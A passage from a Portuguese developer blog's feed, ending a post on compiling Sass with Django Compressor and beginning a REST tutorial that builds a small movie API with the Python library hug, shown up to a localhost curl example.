&lt;p&gt;Agora, a jogada será declarar em nosso &lt;em&gt;template&lt;/em&gt; que todas as folhas de estilo escritas
em &lt;em&gt;Sass&lt;/em&gt;, terão como &lt;code&gt;type&lt;/code&gt; o valor &lt;code&gt;text/x-sass&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- index.html --&amp;gt;&lt;/span&gt;

{% compress css %}
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/skeleton/normalize.css&amp;#39; %}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/skeleton/skeleton.css&amp;#39; %}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;scss/app.scss&amp;#39; %}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/x-sass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
{% endcompress %}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de agora, no momento de execução do &lt;em&gt;Compressor&lt;/em&gt;, além de minificar e concatenar
as folhas de estilo, também interpretará arquivos &lt;em&gt;Sass&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;E com isso, mais uma vez, mostramos que é possível ter um projeto &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;,
utilizando ferramentas bacanas (como o &lt;em&gt;Sass&lt;/em&gt;), sem necessariamente
adicionar uma linguagem diferente à sua &lt;em&gt;stack&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O ideal é que o processo de &lt;em&gt;build&lt;/em&gt; seja executado durante o procedimento
de &lt;em&gt;deploy&lt;/em&gt; do seu projeto (através do comando &lt;code&gt;python manage.py compress&lt;/code&gt;). Para isso,
é necessário ativar o
&lt;a href="http://django-compressor.readthedocs.io/en/latest/scenarios/#offline-compression" title="Offline compression"&gt;&lt;em&gt;offline compression&lt;/em&gt; do &lt;em&gt;Django Compressor&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt; vamos falar sobre &lt;em&gt;Django&lt;/em&gt; + &lt;em&gt;ES6&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima...&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://django-compressor.readthedocs.io/en/latest/"&gt;&lt;em&gt;Django Compressor - Compresses linked and inline JavaScript or CSS into a single cached file&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hongminhee.org/libsass-python/"&gt;&lt;em&gt;libsass - Sass/SCSS for Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="sass"></category><category term="css"></category></entry><entry><title>REST - Parte 2</title><link href="https://klauslaube.com.br/2016/05/20/rest-parte-2.html" rel="alternate"></link><published>2016-05-20T12:35:00-03:00</published><updated>2016-05-20T12:35:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-05-20:/2016/05/20/rest-parte-2.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2016/01/06/rest-parte-1.html" title="Leia a parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;, demos uma pequena introdução
ao conceito de &lt;em&gt;REST&lt;/em&gt; e fizemos um raso comparativo com o seu "rival", o &lt;em&gt;SOAP&lt;/em&gt;.
Nesse artigo falaremos mais sobre como interagir com &lt;em&gt;APIs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt; utilizando
os verbos do protocolo &lt;em&gt;HTTP&lt;/em&gt;, e a biblioteca &lt;a href="http://www.hug.rest/" title="Embrace APIs of the future"&gt;&lt;em&gt;hug&lt;/em&gt;&lt;/a&gt;,
que nos ajudará a ilustrar como uma &lt;em&gt;API …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2016/01/06/rest-parte-1.html" title="Leia a parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;, demos uma pequena introdução
ao conceito de &lt;em&gt;REST&lt;/em&gt; e fizemos um raso comparativo com o seu "rival", o &lt;em&gt;SOAP&lt;/em&gt;.
Nesse artigo falaremos mais sobre como interagir com &lt;em&gt;APIs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt; utilizando
os verbos do protocolo &lt;em&gt;HTTP&lt;/em&gt;, e a biblioteca &lt;a href="http://www.hug.rest/" title="Embrace APIs of the future"&gt;&lt;em&gt;hug&lt;/em&gt;&lt;/a&gt;,
que nos ajudará a ilustrar como uma &lt;em&gt;API&lt;/em&gt; funciona na prática.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Segundo o &lt;a href="https://www.infoq.com/br/articles/rest-introduction" title="Introdução ao REST"&gt;&lt;em&gt;InfoQ&lt;/em&gt;&lt;/a&gt;,
o &lt;em&gt;REST&lt;/em&gt; possui cinco princípios fundamentais:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dê a todas as coisas um identificador&lt;/li&gt;
&lt;li&gt;Vincule as coisas&lt;/li&gt;
&lt;li&gt;Utilize métodos padronizados&lt;/li&gt;
&lt;li&gt;Recursos com múltiplas representações&lt;/li&gt;
&lt;li&gt;Comunique sem estado&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Esses cinco itens nos guiarão daqui para frente.&lt;/p&gt;
&lt;h2&gt;O Uniform Resource Identifier&lt;/h2&gt;
&lt;p&gt;Você já parou para pensar que na &lt;em&gt;Internet&lt;/em&gt; tudo tem um "endereço único"?
Do formulário de contato do seu &lt;em&gt;blog&lt;/em&gt; até um vídeo no &lt;em&gt;Youtube&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;Todo recurso tem um nome e pode ser identificado de forma única.
Esse conceito é conhecido por &lt;em&gt;Uniform Resource Identifier&lt;/em&gt; (&lt;em&gt;URI&lt;/em&gt;) e é
composto pelo &lt;em&gt;Uniform Resource Locator&lt;/em&gt; (&lt;em&gt;URL&lt;/em&gt;) e &lt;em&gt;Uniform Resource Name&lt;/em&gt; (&lt;em&gt;URN&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Logo, quando falamos do endereço &lt;code&gt;http://google.com/index.html&lt;/code&gt;, podemos assumir a seguinte
estrutura:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;google&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;index&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="c1"&gt;------ URL -----|-- URN --|&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="c1"&gt;----------- URI ----------|&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como uma &lt;em&gt;API&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt; é um recurso disponível na &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;,
essa regra não é diferente. Daremos identificadores únicos para cada recurso exposto.&lt;/p&gt;
&lt;p&gt;Utilizaremos o &lt;code&gt;localhost:8000&lt;/code&gt; para os exemplos a seguir. Portanto, vamos imaginar que
temos uma &lt;em&gt;API&lt;/em&gt; de filmes, e gostaríamos de listar todos os filmes. Uma boa prática
é utilizarmos o substantivo no plural. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos supor que o filme "The Matrix", dentro da nossa base de dados, tenha o &lt;em&gt;ID&lt;/em&gt; &lt;code&gt;20&lt;/code&gt;.
Na nossa &lt;em&gt;API&lt;/em&gt; poderíamos acessá-lo através da seguinte &lt;em&gt;URI&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Consequentemente, outro filme teria um identificador diferente. Por exemplo, para acessarmos
o filme "Swordfish", que no nosso exemplo possui o &lt;em&gt;ID&lt;/em&gt; &lt;code&gt;55&lt;/code&gt;, temos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Outra boa prática é utilizarmos &lt;a href="https://en.wikipedia.org/wiki/Universally_unique_identifier" title="Leia mais sobre UUID"&gt;&lt;em&gt;UUIDs&lt;/em&gt;&lt;/a&gt;
ao invés das chaves primárias do nosso banco de dados. Isso obscurece o funcionamento da
aplicação, tornando-a ligeiramente mais segura:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;DED621D5&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="n"&gt;F4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;D32&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ADFA&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;84375&lt;/span&gt;&lt;span class="n"&gt;BA415B9&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Legal! Já tenho como acessar o filme &lt;em&gt;The Matrix&lt;/em&gt;, dentro da nossa "&lt;em&gt;API&lt;/em&gt; imaginária". Será
que temos alguma maneira fácil de acessar, por exemplo, os atores que fazem parte desse
filme?&lt;/p&gt;
&lt;h2&gt;Hipermídia&lt;/h2&gt;
&lt;p&gt;O conceito de hipermídia pode ser bastante abstrato. Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hipermídia é a reunião de várias mídias num ambiente computacional, suportada por sistemas eletrônicos
de comunicação. Hipermídia, diferentemente de multimídia, não é a mera reunião dos meios existentes, e
sim a fusão desses meios a partir de elementos não-lineares.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A melhor forma de entender esse conceito é se olharmos para uma forma de hipermídia muito conhecida: o hipertexto (sim,
o "H" do &lt;a href="https://klauslaube.com.br/tag/html.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;Hypertext Markup Language&lt;/em&gt;&lt;/a&gt;). Nele, temos um "texto interativo",
não necessariamente linear e composto por diferentes outras mídias (como som, vídeo, imagens, etc).&lt;/p&gt;
&lt;p&gt;Mas o ponto que mais ilustra o que é um hipertexto é a capacidade de um texto referenciar a outro. Esse
conceito, chamado de hiperlinks (ou somente &lt;em&gt;links&lt;/em&gt;, para os mais jovens) permite com que eu seja capaz de navegar
entre documentos apenas seguindo as suas referências, sem conhecer previamente o destino do meu passo seguinte.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/social-network-movie.jpg" width="610" height="310" title="Aqui de boas fazendo umas APIs com os meus amigos (cosmopolitan.com)" alt="Aqui de boas fazendo umas APIs com os meus amigos (cosmopolitan.com)"&gt;&lt;/p&gt;
&lt;p&gt;Quando esse conceito é aplicado ao contexto de &lt;em&gt;REST&lt;/em&gt;, temos o que chamamos de &lt;em&gt;Hypermedia as the Engine
of Application State&lt;/em&gt; (&lt;a href="https://en.wikipedia.org/wiki/HATEOAS" title="Leia mais sobre HATEOAS"&gt;&lt;em&gt;HATEOAS&lt;/em&gt;&lt;/a&gt;).
Segundo ele, nosso cliente deve ser capaz de interagir com a nossa aplicação
(e até mesmo demais aplicações vinculadas a ela) através de hipermídia. Dessa forma, eu não preciso necessariamente
conhecer todos os &lt;em&gt;endpoints&lt;/em&gt; de uma &lt;em&gt;API&lt;/em&gt;, ela me informará dada uma determinada &lt;em&gt;URI&lt;/em&gt;, para onde eu posso navegar.&lt;/p&gt;
&lt;p&gt;Pegando a nossa &lt;em&gt;API&lt;/em&gt; de filmes, eu deveria ter dentro da resposta do filme "The Matrix" alguma informação me dizendo
que para listar os atores desse filme, eu deveria acessar &lt;code&gt;http://localhost:8000/movies/DED621D5-08F4-4D32-ADFA-84375BA415B9/actors/&lt;/code&gt;.
E uma vez eu estando nessa listagem, deveria haver um &lt;em&gt;link&lt;/em&gt; me dizendo que para ver os detalhes da
&lt;a href="http://www.imdb.com/name/nm0005251/" title="Carrie-Anne Moss no IMDB"&gt;&lt;em&gt;Carrie-Anne Moss&lt;/em&gt;&lt;/a&gt;, por exemplo,
eu devo acessar a &lt;em&gt;URI&lt;/em&gt; &lt;code&gt;http://localhost:8000/actors/A3531BF5-C089-4A44-8A92-5A5AC08261AA/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;movie&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;uuid&amp;gt;&lt;/span&gt;DED621D5-08F4-4D32-ADFA-84375BA415B9&lt;span class="nt"&gt;&amp;lt;/uuid&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;The Matrix&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;

  &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;actors&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://localhost:8000/movies/DED621D5-08F4-4D32-ADFA-84375BA415B9/actors/&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/movie&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ou em uma resposta em &lt;em&gt;JSON&lt;/em&gt;, poderíamos ter algo parecido com o exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;uuid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DED621D5-08F4-4D32-ADFA-84375BA415B9&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The Matrix&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;

  &lt;span class="nt"&gt;&amp;quot;_links&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;actors&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://localhost:8000/movies/DED621D5-08F4-4D32-ADFA-84375BA415B9/actors/&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Um pouquinho de prática&lt;/h2&gt;
&lt;p&gt;Antes de falarmos sobre os verbos &lt;em&gt;HTTP&lt;/em&gt;, vamos utilizar o &lt;em&gt;hug&lt;/em&gt; para uma abordagem um
pouco mais prática. Iniciamos com a instalação da biblioteca:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip3 install hug
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para tornar as coisas simples, vamos simular o acesso ao banco de dados com o uso de dicionários &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# api.py&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hug&lt;/span&gt;

&lt;span class="n"&gt;MOVIES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;DED621D5-08F4-4D32-ADFA-84375BA415B9&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The Matrix&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;A computer hacker learns from mysterious rebels about the true nature of his reality and his role in the war against its controllers.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A &lt;em&gt;URI&lt;/em&gt; por si só não significa nada. Precisamos de métodos para acessá-la (e manipulá-la), e o protocolo &lt;em&gt;HTTP&lt;/em&gt;
possui alguns verbos que podem executar essas operações para nós.&lt;/p&gt;
&lt;h3&gt;Listagem e detalhes&lt;/h3&gt;
&lt;p&gt;O &lt;em&gt;GET&lt;/em&gt; é sem dúvida o mais famoso deles. É através dele que somos capazes de "pegar" os recursos da &lt;em&gt;web&lt;/em&gt;, incluindo
páginas na Internet como essa que você está lendo. Com esse verbo, podemos listar e visualizar mais detalhes de um
determinado recurso na &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos começar retornando a listagem de filmes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# api.py&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hug&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="nd"&gt;@hug.get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;movies&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;objects&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para executar a &lt;em&gt;API&lt;/em&gt; no seu ambiente local, utilize o seguinte comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hug -f api.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora, ao acessar a &lt;em&gt;URI&lt;/em&gt; &lt;code&gt;http://localhost:8000/movies/&lt;/code&gt;, obtemos a seguinte resposta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;quot;objects&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A computer hacker learns from mysterious rebels about the true nature of his reality and his role in the war against its controllers.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The Matrix&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DED621D5-08F4-4D32-ADFA-84375BA415B9&amp;quot;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
   &lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos ilustrar como seria o acesso via &lt;em&gt;GET&lt;/em&gt; para ver detalhes do recurso "The Matrix". Primeiro,
criamos o método na aplicação que é responsável por dar detalhes de um filme:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hug&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;falcon&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="nd"&gt;@hug.get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/movies/{movie_id}/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;movie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;movie_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;movie_ids&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;movie_id&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;movie_ids&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Not found&amp;#39;&lt;/span&gt;

  &lt;span class="n"&gt;movie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;movie_ids&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;movie_id&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Seguindo uma boa prática, visualizar detalhes de um determinado recurso deveria ter um endereço
composto pelo seu nome (no caso, &lt;code&gt;movies&lt;/code&gt;), mais o seu identificador (no caso, &lt;code&gt;DED621D5-08F4-4D32-ADFA-84375BA415B9&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i http://localhost:8000/movies/DED621D5-08F4-4D32-ADFA-84375BA415B9/

HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Fri, &lt;span class="m"&gt;13&lt;/span&gt; May &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:58:57 GMT
